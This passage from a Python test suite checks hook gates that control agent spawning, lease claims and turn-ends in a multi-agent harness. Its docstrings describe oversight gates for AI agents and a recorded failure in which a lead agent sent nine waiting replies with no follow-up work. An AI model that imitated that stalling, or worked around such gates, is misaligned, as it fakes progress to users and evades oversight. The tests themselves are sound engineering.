    assert run_dispatch(tmp_path, payload).returncode == 0
    assert state.read_item(task["id"])["status"] == "IN_PROGRESS"
    assert dispatch.task_for_agent(state, "child-9")["id"] == task["id"]


def test_post_tool_use_leaves_an_unrecognised_status_alone(tmp_path):
    """PostToolUse means the tool call SUCCEEDED, so an unknown status is an unmeasured platform
    shape — not a failure. Guessing either way is worse than leaving it to the TTL sweep."""
    state, task, header = dispatched_repo(tmp_path)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    payload = spawn_payload(tmp_path, header, event="PostToolUse",
                            tool_response={"status": "something_new"})
    result = run_dispatch(tmp_path, payload)
    assert result.returncode == 0
    assert "unrecognised status" in result.stderr
    assert state.read_item(task["id"])["status"] == "LEASED"


def test_a_failed_spawn_returns_the_task_to_ready_at_once(tmp_path):
    """spec II.4 "Fehlschlag -> sofort zurueck auf READY", on the ONE failure event that was
    measured to arrive. A failing tool call fires PostToolUseFailure, so a gate listening only on
    PostToolUse would leave the task LEASED.

    This event is an ACCELERATOR and no longer the guarantee. What it used to sit beside —
    `PermissionDenied` — fired in none of twelve real sessions (see tools/provider_observations.json),
    and the two together were the ONLY way back from a spent claim. The guarantee is now the bind
    window closing empty; the two tests below measure that half."""
    state, task, header = dispatched_repo(tmp_path)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    assert run_dispatch(tmp_path, spawn_payload(tmp_path, header,
                                                event="PostToolUseFailure")).returncode == 0
    assert state.read_item(task["id"])["status"] == "READY"


def _lease_of(state, task_id):
    return state._read_yaml(os.path.join(state.root, "tasks", "leases", task_id + ".lease.yaml"))


def _close_the_bind_window(state, task_id):
    """Age a lease's bind window into the past — the only thing a test can do about a clock."""
    path = os.path.join(state.root, "tasks", "leases", task_id + ".lease.yaml")
    lease = state._read_yaml(path)
    lease["awaiting_bind_until"] = time.time() - 1.0
    state._write_yaml_atomic(path, lease)


def test_a_claim_whose_child_never_arrived_returns_the_task_to_ready_at_stop(tmp_path):
    """THE WAY BACK for a lease spent on a spawn that never happened, and it needs no failure
    event at all.

    Measured 2026-08-02: a permission refusal delivers NO hook event, and `PermissionDenied` —
    which carried the rollback — fired in none of twelve sessions. So the rollback is decided
    locally: dispatched, no bound child, bind window closed, task still LEASED. `Stop` is where it
    runs at the latest, because `Stop` is the event those twelve sessions did all deliver, even
    after four refused tool calls.

    What only a real session can show is that Stop keeps arriving; that this gate does the right
    thing when it does is what this measures."""
    state, task, header = dispatched_repo(tmp_path)
    assert run_dispatch(tmp_path, spawn_payload(tmp_path, header)).returncode == 0
    assert state.read_item(task["id"])["status"] == "LEASED"
    _close_the_bind_window(state, task["id"])
    result = run_dispatch(tmp_path, {"hook_event_name": "Stop", "cwd": str(tmp_path)})
    assert result.returncode == 0, result.stderr          # Stop CAN block; this one never does
    assert "returned to READY" in result.stderr
    assert state.read_item(task["id"])["status"] == "READY"


def test_a_running_child_is_not_swept_by_the_reconciliation(tmp_path):
    """The counterpart, and the reason the rollback names four conditions instead of one: a child
    that DID start holds `agent_id`, and freeing its task would leave it running against a task
    somebody else can now lease."""
    state, task, header = dispatched_repo(tmp_path)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    run_dispatch(tmp_path, {"hook_event_name": "SubagentStart", "cwd": str(tmp_path),
                            "agent_id": "child-live", "agent_type": "backend-developer"})
    _close_the_bind_window(state, task["id"])
    assert run_dispatch(tmp_path, {"hook_event_name": "Stop",
                                   "cwd": str(tmp_path)}).returncode == 0
    assert state.read_item(task["id"])["status"] == "LEASED"
    assert dispatch.task_for_agent(state, "child-live")["id"] == task["id"]


def test_a_lease_nobody_dispatched_is_not_swept_by_the_reconciliation(tmp_path):
    """The other half of the same guard. A lease its owner has created but not spawned against
    carries no claim, so nothing about it has failed — sweeping it would take a task away from the
    role that is about to dispatch it."""
    state, task, _header = dispatched_repo(tmp_path)
    assert run_dispatch(tmp_path, {"hook_event_name": "Stop",
                                   "cwd": str(tmp_path)}).returncode == 0
    assert state.read_item(task["id"])["status"] == "LEASED"
    assert _lease_of(state, task["id"])["nonce"]          # the lease is still there to spawn with


def test_a_bound_child_blocks_a_second_claim_even_after_the_window(tmp_path):
    """`agent_id` is the term that does not expire, and it is the one that matters: a lease with a
    running child must stay unclaimable however long that child runs. Without this term the whole
    second-claim rule would evaporate BIND_WINDOW seconds after every spawn."""
    state, task, header = dispatched_repo(tmp_path)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    run_dispatch(tmp_path, {"hook_event_name": "SubagentStart", "cwd": str(tmp_path),
                            "agent_id": "child-bound", "agent_type": "backend-developer"})
    _close_the_bind_window(state, task["id"])
    result = run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    assert result.returncode == 2
    assert "already bound" in result.stderr


def test_the_retry_after_a_reconciled_claim_is_told_what_to_do(tmp_path):
    """A dead end is only ended if the way out is walkable. After the reconciliation the lease is
    gone and the task is READY, so the next spawn on the OLD header must not merely fail — it has
    to name the one command that gets the role moving again."""
    state, task, header = dispatched_repo(tmp_path)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    _close_the_bind_window(state, task["id"])
    result = run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    assert result.returncode == 2
    assert "create a lease from READY first" in result.stderr
    assert state.read_item(task["id"])["status"] == "READY"


# -- the dispatch nobody is working on any more (BUG-0058, pilot 4 P4-2) ------

def _stop(tmp_path, **extra):
    return dict({"hook_event_name": "Stop", "cwd": str(tmp_path)}, **extra)


def _child_stop(tmp_path, message="summary: nothing came of it", **extra):
    return dict({"hook_event_name": "SubagentStop", "cwd": str(tmp_path),
                 "agent_id": "child-1", "agent_type": "backend-developer",
                 "last_assistant_message": message}, **extra)


def _running_dispatch(tmp_path):
    """The state pilot 4 half 2 measured: IN_PROGRESS, live lease, a background child bound to it.

    Driven through the real hook processes, because the whole finding is about what the LEAD is
    handed at the end of its turn and every step of that is a hook: the spawn claims, the
    `async_launched` response — the shape a background spawn really reports — binds and starts.
    """
    state, task, header = dispatched_repo(tmp_path)
    assert run_dispatch(tmp_path, spawn_payload(tmp_path, header)).returncode == 0
    started = spawn_payload(tmp_path, header, event="PostToolUse",
                            tool_response={"status": "async_launched", "agentId": "child-1"})
    assert run_dispatch(tmp_path, started).returncode == 0
    assert state.read_item(task["id"])["status"] == "IN_PROGRESS"
    return state, task


def test_the_turn_end_is_refused_for_a_dispatch_whose_child_stopped(tmp_path):
    """BUG-0058 / pilot 4 P4-2, driven through the events the provider really delivers.

    THE MEASURED FAILURE: the dispatched specialist made two tool calls, produced no file and
    stopped; the task stayed IN_PROGRESS with a live lease and an empty staging directory, and the
    lead answered NINE consecutive user turns with waiting phrases without one follow-up call.
    Nothing in the apparatus asked whether anything was still behind that status.

    RED without the fix: the second Stop exits 0 with an empty stderr, exactly like the first —
    the lead ends the turn with nothing in front of it and says "I will let you know" again.

    The control is the FIRST stop: while the child is running the turn ends untouched, so this
    cannot be satisfied by refusing every turn that has a dispatch open. And the task is not
    MOVED by any of it: the finding is reported, and what to do about it stays the lead's.
    """
    state, task = _running_dispatch(tmp_path)
    while_running = run_dispatch(tmp_path, _stop(tmp_path))
    assert while_running.returncode == 0, while_running.stderr
    assert task["id"] not in while_running.stderr

    assert run_dispatch(tmp_path, _child_stop(tmp_path)).returncode == 0
    refused = run_dispatch(tmp_path, _stop(tmp_path))
    assert refused.returncode == 2, refused.stdout + refused.stderr
    assert task["id"] in refused.stderr
    assert "no result was booked" in refused.stderr
    assert "nothing was staged for it" in refused.stderr
    # the way out is named, and it is the automaton's own edge rather than a status typed here
    assert dispatch.no_progress_status("IN_PROGRESS") in refused.stderr
    assert "checkpoint-status" in refused.stderr and "submit-result" in refused.stderr
    assert state.read_item(task["id"])["status"] == "IN_PROGRESS"


def test_a_turn_that_ends_over_a_child_which_outlived_its_lease_is_not_refused(tmp_path):
    """THE FALSE POSITIVE AT THE LAYER THE LEAD MEETS IT, and its chain ran to work loss.

    A running child may hold IN_PROGRESS past its lease's expiry -- `dispatch.LEASE_MINTED_STATUS`
    says so -- and an earlier cut of this gate refused the turn-end over exactly that, with a
    remedy that takes the task to FAILED. Following it drops the lease, `task_for_agent` then
    resolves nothing, and the child's own `submit-result` is refused: the work of a specialist that
    was still going is what the refusal would have cost.

    Measured through the real Stop process, and the second assertion is what the first is for: the
    dispatch is untouched and its result can still be booked.
    """
    state, task = _running_dispatch(tmp_path)
    path = os.path.join(state.root, "tasks", "leases", task["id"] + ".lease.yaml")
    lease = state._read_yaml(path)
    lease["created_epoch"] = time.time() - float(lease["ttl"]) - 1.0
    state._write_yaml_atomic(path, lease)
    assert not dispatch.lease_in_force(state, task["id"])

    result = run_dispatch(tmp_path, _stop(tmp_path))
    assert result.returncode == 0, result.stdout + result.stderr
    assert task["id"] not in result.stderr
    assert dispatch.task_for_agent(state, "child-1")["id"] == task["id"]
    assert state.read_item(task["id"])["status"] == "IN_PROGRESS"


def test_the_same_idle_finding_refuses_only_one_turn_end(tmp_path):
    """A refused stop is answered by CONTINUING, and the condition outlives the refusal — so a
    finding that could refuse twice would hold the session in a loop with no way out.

    Both bounds are measured, because either alone is one provider change away from being nothing:
    the harness's own record (`dispatch.mark_idle_reported`), and `stop_hook_active`, the key the
    provider sets on a continuation a stop hook caused — the same one `gate_subagent_output` has
    relied on since BUG-0049.
    """
    _state, task = _running_dispatch(tmp_path)
    run_dispatch(tmp_path, _child_stop(tmp_path))
    assert run_dispatch(tmp_path, _stop(tmp_path)).returncode == 2
    again = run_dispatch(tmp_path, _stop(tmp_path))
    assert again.returncode == 0, again.stderr
    assert task["id"] not in again.stderr

    # ...and the other bound, measured on a finding that has NOT been said yet
    second = tmp_path.parent / (tmp_path.name + "-b")
    _state2, task2 = _running_dispatch(second)
    run_dispatch(second, _child_stop(second))
    held = run_dispatch(second, _stop(second, stop_hook_active=True))
    assert held.returncode == 0, held.stderr
    assert task2["id"] not in held.stderr
    # standing down is not forgetting: the next ordinary stop still says it
    assert run_dispatch(second, _stop(second)).returncode == 2


def test_a_reconciled_claim_does_not_swallow_the_idle_finding_beside_it(tmp_path):
    """TWO THINGS CAN BE TRUE OF ONE TURN-END, and the reconciliation used to eat the other one.

    `Stop` does two jobs: it gives back a claim that never produced a child, and it names the
    dispatches nothing is working on. The first reports through `_report`, which exits — so a turn
    in which BOTH happened ended silently on the second, and the finding waited for a turn in which
    no claim needed reconciling. Measured here with both in one Stop: the claim goes back to READY,
    and the idle dispatch beside it is still refused over.
    """
    state, running = _running_dispatch(tmp_path)
    never_started = dispatch.create_task(
        state, dict(TSK_FIELDS, product_requirement="PR-0001",
                    allowed_scope=["analytics/"],
                    expected_outputs=["analytics/x.py"]))
    state.transition(never_started["id"], "READY")
    satisfy_the_architect_step(state, state.read_item(never_started["id"]),
                               state.read_item("PR-0001"))
    header = dispatch.dispatch_header(dispatch.create_lease(state, never_started["id"]))
    assert run_dispatch(tmp_path, spawn_payload(tmp_path, header)).returncode == 0
    _close_the_bind_window(state, never_started["id"])
    run_dispatch(tmp_path, _child_stop(tmp_path))

    result = run_dispatch(tmp_path, _stop(tmp_path))
    assert result.returncode == 2, result.stdout + result.stderr
    assert "returned to READY" in result.stderr and never_started["id"] in result.stderr
    assert running["id"] in result.stderr, (
        "the reconciliation reported and the idle dispatch beside it was never named: %s"
        % result.stderr)
    assert state.read_item(never_started["id"])["status"] == "READY"


def _registered_chain_command(claude_dir, tmp_path, event, gate):
    """The command line settings.json registers for `event` that runs `gate` — READ, not built.

    The ORDER of that chain is the whole subject of the test below, so a test that assembled its
    own command line would be measuring itself. Same reader as `registered_hooks`
    (`kernel.report._invoked_scripts`), for the reason that one gives.
    """
    settings = json.load(open(os.path.join(claude_dir, "settings.json"), encoding="utf-8"))
    sys.path.insert(0, TEAM_KITS)
    from kernel.report import _invoked_scripts
    found = [hook["command"] for entry in settings["hooks"][event]
             for hook in entry.get("hooks") or []
             if gate in _invoked_scripts(hook.get("command", ""))]
    assert len(found) == 1, "expected ONE %s command running %s, got %d" % (event, gate,
                                                                           len(found))
    parts = found[0].replace("${CLAUDE_PROJECT_DIR}", str(tmp_path)).replace('"', "").split()
    assert parts[0].startswith("python"), parts
    return [sys.executable] + parts[1:]


@pytest.mark.parametrize("kit", KITS)
def test_a_child_told_to_continue_is_not_recorded_as_having_ended(tmp_path, kit):
    """WHY THE RECORDER IS LAST IN THE SubagentStop CHAIN, measured on the shipped registration.

    `gate_subagent_output` exits 2 on a final message without its output contract, and the child
    then KEEPS WORKING — so that stop is not an end. A recorder in front of it would write one
    anyway, and the lead's next turn-end would be refused over a specialist that is still running:
    the mechanism would produce the false alarm that teaches a lead to ignore it.

    Both directions through the SHIPPED command line, so the property belongs to the registration
    and not to this test: the blocked stop records nothing, and the same chain on a
    contract-honouring stop records the end.
    """
    claude = _install_enforcement_bundle(tmp_path, kit)
    state, task, header = dispatched_repo(tmp_path)
    run_dispatch(tmp_path, spawn_payload(tmp_path, header))
    run_dispatch(tmp_path, spawn_payload(tmp_path, header, event="PostToolUse",
                                         tool_response={"status": "async_launched",
                                                        "agentId": "child-1"}))
    command = _registered_chain_command(claude, tmp_path, "SubagentStop", "gate_dispatch.py")
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path))
    env.pop("HARNESS_KERNEL_PATH", None)          # the installed bundle carries its own kernel

    def child_stops(message):
        return subprocess.run(command, input=json.dumps(_child_stop(tmp_path, message)),
                              capture_output=True, text=True, env=env, timeout=180)

    blocked = child_stops("I did not manage anything, sorry.")
    assert blocked.returncode == 2, blocked.stdout + blocked.stderr
    assert "output-contract" in blocked.stderr
    assert dispatch.CHILD_ENDED not in state.read_item(task["id"]), (
        "%s: the child was told to keep working and its dispatch was recorded as ended anyway "
        "— the recorder runs in front of the gate that can refuse this stop" % kit)
    assert run_dispatch(tmp_path, _stop(tmp_path)).returncode == 0

    honoured = child_stops("summary: nothing came of it")
    assert honoured.returncode == 0, honoured.stdout + honoured.stderr
    assert state.read_item(task["id"]).get(dispatch.CHILD_ENDED), (
        "%s: a stop the chain let through recorded no end, so the finding can never arise" % kit)


def _install_enforcement_bundle(tmp_path, kit, roles=("project-manager", "backend-developer")):
    """Put a kit's hooks, kernel, settings and agent files where a scaffolded project has them.

    So the command under test can be the one settings.json really spells, `${CLAUDE_PROJECT_DIR}`
    and all, instead of a path this test invents.
    """
    claude = os.path.join(str(tmp_path), ".claude")
    shutil.copytree(os.path.join(TEAM_KITS, kit, "hooks"), os.path.join(claude, "hooks"),
                    ignore=shutil.ignore_patterns("__pycache__"))
    shutil.copytree(os.path.join(TEAM_KITS, "kernel"), os.path.join(claude, "kernel"),
                    ignore=shutil.ignore_patterns("__pycache__"))
    shutil.copy(os.path.join(TEAM_KITS, kit, "settings", "settings.json"),
                os.path.join(claude, "settings.json"))
    for role in roles:
        write(os.path.join(claude, "agents", role + ".md"),
              "---\nname: %s\n---\nrole body\n" % role)
    return claude


def _registered_spawn_command(claude_dir, tmp_path):
    """The PreToolUse(Agent|Task) command line, read off the INSTALLED settings.json.

    Read rather than reconstructed: the whole finding this measures is about how the kits REGISTER
    their spawn gates, so a test that assembled its own command line would be measuring itself.
    """
    settings = json.load(open(os.path.join(claude_dir, "settings.json"), encoding="utf-8"))
    entries = [entry for entry in settings["hooks"]["PreToolUse"]
               if (entry.get("matcher") or "") == "Agent|Task"]
    assert len(entries) == 1, "expected ONE PreToolUse(Agent|Task) group, got %d" % len(entries)
    commands = [hook["command"] for hook in entries[0]["hooks"]]
    assert len(commands) == 1, (
        "the spawn gates are registered as %d separate commands. Every PreToolUse hook of an "
        "event runs to completion even when a sibling exits 2 (measured 2026-08-02), so a gate "
        "that SPENDS a lease must not be one of several parallel processes." % len(commands))
    command = commands[0].replace("${CLAUDE_PROJECT_DIR}", str(tmp_path)).replace('"', "")
    parts = command.split()
    assert parts[0].startswith("python"), parts
    # WHICH gate has to be last is NOT decided here, and deliberately not: a named last token is a
    # rule about one filename, and the rule is about a property. It is measured — by running each
    # gate of this chain alone and watching the canonical state — in
    # `test_no_gate_that_mutates_the_state_runs_in_front_of_one_that_can_still_refuse`.
    return [sys.executable] + parts[1:]


def _chain_gates(command, project_dir):
    """[(gate filename, argv to run that gate ALONE through the shipped launcher)], in order.

    `command` is a registered command line, `${CLAUDE_PROJECT_DIR}` and all — read off a
    settings.json, never assembled here (see `_registered_spawn_command` for why that matters).
    """
    command = command.replace("${CLAUDE_PROJECT_DIR}", str(project_dir)).replace('"', "").split()
    assert command[0].startswith("python"), command
    command = [sys.executable] + command[1:]
    scripts = [index for index, token in enumerate(command) if token.endswith(".py")]
    assert len(scripts) >= 2, command          # the launcher plus at least one gate
    prefix, launcher = command[:scripts[0]], command[scripts[0]]
    return [(os.path.basename(command[index]),
             prefix + [launcher, command[index]]) for index in scripts[1:]]


def _multi_gate_chains(kit):
    """[(event, matcher, command)] for every registration of `kit` that runs MORE THAN ONE gate.

    Read off the shipped settings, so a chain added on a new event is in the subject of the rule
    below the day it ships rather than the day somebody remembers it.

    THE MATCHER TRAVELS WITH THE CHAIN since 2026-08-28, and that is a correction rather than an
    addition: this returned `(event, command)` and the rule below keyed its payload on the EVENT,
    which is a claim that one event carries at most one chain. The office kit disproved it the day
    `gate_filing gate_second_reading` shipped (FR-0035) — two PreToolUse chains, on disjoint
    matchers, and the spawn payload drives neither of them into the other's gates.
    """
    sys.path.insert(0, TEAM_KITS)
    from kernel.report import _invoked_scripts
    path = os.path.join(TEAM_KITS, kit, "settings", "settings.json")
    settings = json.load(open(path, encoding="utf-8"))
    return [(event, entry.get("matcher"), hook["command"])
            for event, entries in (settings.get("hooks") or {}).items()
            for entry in entries
            for hook in entry.get("hooks") or []
            if len(_invoked_scripts(hook.get("command", ""))) > 2]      # launcher + >= 2 gates


def _a_spawn_the_chain_accepts(root):
    """A project with a leased task, and the PreToolUse(Agent) call its spawn chain accepts.

    WITH AN APPROVED `PROC` AND A WORK ORDER THAT NAMES IT, which this fixture did not carry until
    2026-08-28 — and "the chain accepts" was then not true of the office kit at all: measured,
    `gate_proc_approved` refused this very payload with "this project has no approved procedure at
    all", so the two gates behind it decided nothing while `gate_dispatch`, run alone, still claimed
    the lease. The caller's own docstring promised a payload the chain accepts; this is what makes
    that promise measurable rather than asserted. The kits without that gate are unaffected by the
    extra item, which is just more state in the before/after diff.
    """
    from conftest import walk_to_status
    state, _task, header = dispatched_repo(root)
    procedure = walk_to_status(state, state.capture(
        "PROC", {"title": "inbox sweep", "steps": ["read", "file"],
                 "roles": ["backend-developer"]}), "APPROVED")
    return state, {"hook_event_name": "PreToolUse", "tool_name": "Agent", "cwd": str(root),
                   "tool_input": {"subagent_type": "backend-developer",
                                  "run_in_background": False,
                                  "prompt": "objective: run %s\n%s\noutput: a result"
                                            % (procedure["id"], header)}}


def _a_child_stop_the_chain_accepts(root):
    """A project with a running dispatch, and the SubagentStop its chain lets through.

    The final message honours the output contract on purpose: a stop the first gate REFUSES is a
    continuation and not an end, so it would measure the wrong thing here (that half is
    `test_a_child_told_to_continue_is_not_recorded_as_having_ended`).
    """
    state, _task = _running_dispatch(root)
    return state, _child_stop(root)


def _a_filing_the_chain_accepts(root):
    """A project with a filing plan, and the Bash move the office FILING chain lets through.

    The plan releases this rule from the SECOND reading (`second_reading: false`), which asks for
    one — never for none — so the fixture records one and has the shipped recorder attest it through
    its own launcher. That is the smallest state on which BOTH gates of this chain reach a decision
    about a real filing instead of exiting on the tool name; what the rule itself means is measured
    where it belongs, in `tools/test_hooks.py`
    (`test_a_plan_rule_can_release_its_own_class_from_the_second_reading`).
    """
    state, task, _header = dispatched_repo(root)
    destination = "archive/finance/2026/2026-01-01_ACME.pdf"
    write(os.path.join(state.root, "filing_plan.yaml"),
          'rules:\n  - id: FP-001\n    path_template: "archive/finance/<year>/"\n'
          "    document_types: [invoice]\n    second_reading: false\n")
    write(os.path.join(str(root), "inbox", "a.pdf"), "a document that was really read\n")
    record = os.path.join(state.root, "staging", task["id"], "readings.yaml")
    write(record, "task_id: %s\nrole: records-clerk\nreadings:\n  - source: inbox/a.pdf\n"
                  "    destination: %s\n    document_class: invoice\n" % (task["id"], destination))
    subprocess.run(
        [sys.executable, "-B", os.path.join(str(root), ".claude", "hooks", "_gate.py"),
         "record_filing_reading.py"],
        input=json.dumps({"hook_event_name": "PostToolUse", "tool_name": "Write", "cwd": str(root),
                          "agent_id": "clerk-1", "tool_input": {"file_path": record}}),
        capture_output=True, text=True, timeout=180,
        env=dict(os.environ, CLAUDE_PROJECT_DIR=str(root), HARNESS_KERNEL_PATH=""))
    return state, {"hook_event_name": "PreToolUse", "tool_name": "Bash", "cwd": str(root),
                   "tool_input": {"command": "mv inbox/a.pdf %s" % destination}}


def _a_staged_reading_the_recorders_accept(root):
    """A project with a staged classification reading, and the PostToolUse `Write` that created it.

    The office kit's second chained registration (FR-0065) is the pair of RECORDERS —
    `record_filing_reading` and `record_booking_reading` — and it needs a payload that reaches their
    decision path rather than their tool-name exit. A record under `staging/<TSK-ID>/` is what both
    of them scan for, and the `Write` naming it is the call whose `agent_id` they attest with.

    Neither of them mutates the CANONICAL state by `_canonical_state`'s reading (an attestation is a
    `.jsonl` line, not one of `_kernel.CANONICAL_SUFFIXES`), which is the correct answer here and not
    an omission: the assertions above allow a chain with no mutating gate, and the kit-wide control
    is satisfied by the spawn chain.
    """
    state, task, _header = dispatched_repo(root)
    record = os.path.join(state.root, "staging", task["id"], "readings.yaml")
    write(record, "task_id: %s\nrole: records-clerk\nreadings:\n  - source: inbox/a.pdf\n"
                  "    destination: archive/finance/2026/2026-01-01_ACME.pdf\n"
                  "    document_class: invoice\n" % task["id"])
    return state, {"hook_event_name": "PostToolUse", "tool_name": "Write", "cwd": str(root),
                   "agent_id": "clerk-1", "tool_input": {"file_path": record}}


# The payload that drives a chain, per (EVENT, the tool it arrives on) — a fixture list, and the
# test below refuses a chain it has none for, so a new multi-gate chain cannot join the tree
# unmeasured. The tool is what SELECTS the payload for a chain: a registration's matcher says which
# tools reach it, so the payload for a chain is one whose tool that matcher accepts. `None` is the
# entry for a registration that carries no matcher at all, which reaches every call of its event.
_CHAIN_PAYLOADS = {
    ("PreToolUse", "Agent"): _a_spawn_the_chain_accepts,
    ("PreToolUse", "Bash"): _a_filing_the_chain_accepts,
    ("PostToolUse", "Write"): _a_staged_reading_the_recorders_accept,
    ("SubagentStop", None): _a_child_stop_the_chain_accepts,
}


def _payload_for(event, matcher):
    """The builder whose payload this chain really receives, or None when the list has none.

    A chain with NO matcher takes the `None` entry of its event (it reaches every call); a chain
    WITH one takes the entry whose tool that matcher accepts. Exactly one must apply — two would
    mean the fixture list, not the registration, decides what a chain is measured on.
    """
    found = [builder for (chain_event, tool), builder in _CHAIN_PAYLOADS.items()
             if chain_event == event
             and (tool is None if matcher is None
                  else tool is not None and re.match("^(?:%s)$" % matcher, tool))]
    assert len(found) < 2, (event, matcher, found)
    return found[0] if found else None


def _canonical_state(root):
    """{relpath: sha256} of every CANONICAL artifact under `project_memory`.

    "Canonical" is the KERNEL's own answer (`_kernel.CANONICAL_SUFFIXES`), not a second one
    invented here — which also settles what is deliberately NOT in the subject: the append-only
    `.audit/*.jsonl` trail carries no suffix from that tuple, so a gate that REFUSES and records
    the refusal does not thereby count as touching the state. That distinction is the whole
    measurement: refusing is free, mutating is not.
    """
    digest, state_root = {}, os.path.join(str(root), "project_memory")
    for directory, _subdirs, files in os.walk(state_root):
        for name in files:
            if not name.lower().endswith(_kernel.CANONICAL_SUFFIXES):
                continue
            path = os.path.join(directory, name)
            with open(path, "rb") as handle:
                digest[os.path.relpath(path, state_root)] = hashlib.sha256(
                    handle.read()).hexdigest()
    return digest


@pytest.mark.parametrize("kit", KITS)
def test_no_gate_that_mutates_the_state_runs_in_front_of_one_that_can_still_refuse(tmp_path, kit):
    """THE PROPERTY, DERIVED BY RUNNING IT — not a filename asserted to be last, and not one event.

    The rule behind every chained registration is: a gate that CHANGES the project state must not
    decide before every gate that could still refuse the same call has spoken, because a sibling's
    exit 2 does not stop it (measured 2026-08-02). Written as "gate_dispatch is the last token"
    that rule covered exactly one file and exactly today: a SECOND gate that started mutating, or
    an existing one that grew a write, would walk straight past it.

    AND IT IS NOT A RULE ABOUT PreToolUse EITHER, which is what this used to measure. The kits ship
    a second chain — `SubagentStop`, where `gate_subagent_output` can turn the stop into a
    continuation and `gate_dispatch` records the child's end (BUG-0058) — and it was covered by
    nothing but a filename order in a settings comment. Every registration that runs more than one
    gate is now the subject (`_multi_gate_chains`), and a chain on an event this file has no
    payload for FAILS rather than being skipped, so a new one cannot join the tree unmeasured.

    Membership is measured instead of named. Each gate of a chain is run ALONE, as a real process
    through the shipped launcher, against its own restored copy of one project state, on a payload
    the chain as a whole accepts. A gate is MUTATING when the canonical state differs afterwards.
    The verdict the gate returns is not part of the question — a gate that refuses AND writes is
    exactly the case being hunted.

    Two assertions follow from the rule, and they are the whole of it:
      * at most ONE gate of a chain may mutate, because a second mutating gate necessarily stands
        in front of the first one's refusal;
      * that one must be LAST.
    TWO CONTROLS, and the first replaced a third assertion that read `assert mutating` per chain.
    That one said "the fixture never reached the mutating step" — true while every chain in the tree
    HAD a mutating step, and false the day a chain of pure judges shipped (`gate_filing
    gate_second_reading`, FR-0035), where it demanded a mutation the chain must not perform. So:
      * per chain, the whole chain must ACCEPT its payload — that is what proves every gate reached
        its decision path rather than sitting behind an earlier refusal;
      * across the kit, SOME gate must have mutated, or the apparatus has stopped being able to
        detect a mutation at all and the two assertions above are vacuous everywhere.

    WHAT IT STILL CANNOT SEE, named rather than implied: a gate that mutates only on an input the
    fixture does not produce reads as non-mutating here. The measurement is as good as the payload,
    which is why each payload is one the chain really accepts.
    """
    chains = _multi_gate_chains(kit)
    assert chains, "%s: no chained registration at all — the rule below has no subject" % kit
    unmeasurable = sorted("%s(%s)" % (event, matcher) for event, matcher, _c in chains
                          if _payload_for(event, matcher) is None)
    assert not unmeasurable, (
        "%s registers a multi-gate chain on %s and this test has no payload that its matcher lets "
        "through. Add one to _CHAIN_PAYLOADS; a chain nobody can drive is a chain whose order "
        "nothing checks." % (kit, unmeasurable))

    mutated_somewhere = []
    for index, (event, matcher, command) in enumerate(chains):
        root = tmp_path / ("%s-%d" % (event, index))
        _install_enforcement_bundle(root, kit)
        state, payload_data = _payload_for(event, matcher)(root)
        gates = _chain_gates(command, root)
        payload = json.dumps(payload_data)
        env = dict(os.environ, CLAUDE_PROJECT_DIR=str(root))
        env.pop("HARNESS_KERNEL_PATH", None)      # the installed bundle carries its own kernel

        pristine = os.path.join(str(root), "pristine")
        shutil.copytree(state.root, pristine)
        mutating, refused = [], []
        for gate, argv in gates:
            shutil.rmtree(state.root)
            shutil.copytree(pristine, state.root)       # every gate meets the SAME state
            before = _canonical_state(root)
            result = subprocess.run(argv, input=payload, capture_output=True, text=True, env=env,
                                    timeout=180)
            if result.returncode:
                refused.append("%s: %s" % (gate, result.stderr.strip()[:400]))
            if _canonical_state(root) != before:
                mutating.append(gate)
        shutil.rmtree(state.root)
        shutil.copytree(pristine, state.root)

        names = [gate for gate, _argv in gates]
        where = "%s %s(%s) chain %s" % (kit, event, matcher, names)
        assert not refused, (
            "%s: the payload this chain is measured on is refused, so every gate behind the "
            "refusal decided nothing and the order below is unmeasured:\n  %s"
            % (where, "\n  ".join(refused)))
        assert len(mutating) <= 1, (
            "%s: %s both mutate the state on one call, so the earlier one pays for a call the "
            "later one can still refuse" % (where, mutating))
        if mutating:
            assert mutating[0] == names[-1], (
                "%s: %s changes the state and is not last — every gate after it can still exit 2, "
                "and nothing gives back what it wrote" % (where, mutating[0]))
        mutated_somewhere += mutating
    assert mutated_somewhere, (
        "%s: not one gate of any chained registration changed the state on a call the chain "
        "accepts — the fixtures never reach a mutating step, so the ordering rule is measured "
        "against nothing" % kit)


@pytest.mark.parametrize("kit", KITS)
def test_a_refused_spawn_does_not_spend_the_lease_through_the_registered_chain(tmp_path, kit):
    """THE MEASURED DEAD END, driven through the command settings.json really registers.

    2026-08-02, real session: `guard_agent_spawn` refused a spawn with rc 2 for a missing
    `run_in_background`, and `gate_dispatch` — a separate process of the same event, which the
    provider runs to completion regardless — claimed the lease anyway. The retry was then refused
    with "a second claim on one lease is blocked" for the remaining ~900 s, and the rollback that
    should have undone it was registered on `PermissionDenied`, which does not fire.

    The INVARIANT is asserted on every outcome the chain produces, not just on the refusal: a
    lease is spent exactly when the chain allowed the call. Asserting only the exit code would
    pass on a chain that refuses and spends anyway, which is the defect itself; asserting only the
    refusal would pass on a chain that never claims at all."""
    claude = _install_enforcement_bundle(tmp_path, kit)
    role = "backend-developer"
    state, task, header = dispatched_repo(tmp_path)
    command = _registered_spawn_command(claude, tmp_path)
    env = dict(os.environ, CLAUDE_PROJECT_DIR=str(tmp_path))
    env.pop("HARNESS_KERNEL_PATH", None)          # the installed bundle carries its own kernel

    def spawn(**tool_input):
        payload = {"hook_event_name": "PreToolUse", "tool_name": "Agent", "cwd": str(tmp_path),
                   "tool_input": dict({"subagent_type": role,
                                       "prompt": "objective: do it\n%s\noutput: a result"
                                                 % header}, **tool_input)}
        return subprocess.run(command, input=json.dumps(payload), capture_output=True, text=True,
                              env=env, timeout=180)

    refused = spawn()                                    # no run_in_background -> guard refuses
    assert refused.returncode == 2, refused.stdout + refused.stderr
    assert "run_in_background" in refused.stderr
    assert "dispatched_at" not in _lease_of(state, task["id"]), (
        "a gate refused this spawn and the lease was spent anyway: %s" % refused.stderr)

    allowed = spawn(run_in_background=False)             # the corrected retry, seconds later
    spent = bool(_lease_of(state, task["id"]).get("dispatched_at"))
    assert spent == (allowed.returncode == 0), (
        "rc %d but lease spent=%s — a chain must spend the lease exactly when it lets the spawn "
